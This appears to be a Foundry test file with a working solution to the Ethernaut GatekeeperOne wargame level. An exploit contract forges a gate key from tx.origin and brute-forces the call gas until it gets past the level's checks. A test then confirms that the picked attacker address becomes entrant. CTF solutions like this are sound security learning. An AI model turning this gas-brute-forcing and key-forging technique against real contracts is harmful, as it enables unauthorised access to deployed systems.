// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/GateKeeperOne.sol";

contract ExploitGateKeeperOne {

    function calculateKey(address txOrigin) internal pure returns (bytes8) {
        return bytes8(uint64(uint16(uint160(txOrigin))) + 2 ** 33);
    }

    function exploit(address _gateKeeperOne) external {
        uint256 gas;
        bytes memory _data = abi.encodeWithSelector(
            GatekeeperOne.enter.selector, calculateKey(tx.origin)
        );
        for(uint256 i=0; i < 256; i++) {
            gas = i + 150 + 8191 * 3;
            (bool success, )= _gateKeeperOne.call{gas: gas}(_data);
            if(success) {
                break;
            }
        }
    }

}


contract TestGateKeeperOne is Test {
    GatekeeperOne gateKeeperOne;
    ExploitGateKeeperOne exploitGateKeeperOne;
    // picked some
    address attacker = address(0xe688b84b23f322a994A53dbF8E15FA82CDB71127);

    function setUp() external {
        gateKeeperOne = new GatekeeperOne();
        exploitGateKeeperOne = new ExploitGateKeeperOne();
    }

    function testExploit() external {
        assertEq(gateKeeperOne.entrant(), address(0));
        vm.startPrank(attacker, attacker);
        exploitGateKeeperOne.exploit(address(gateKeeperOne));
        assertEq(gateKeeperOne.entrant(), attacker);
    }
}
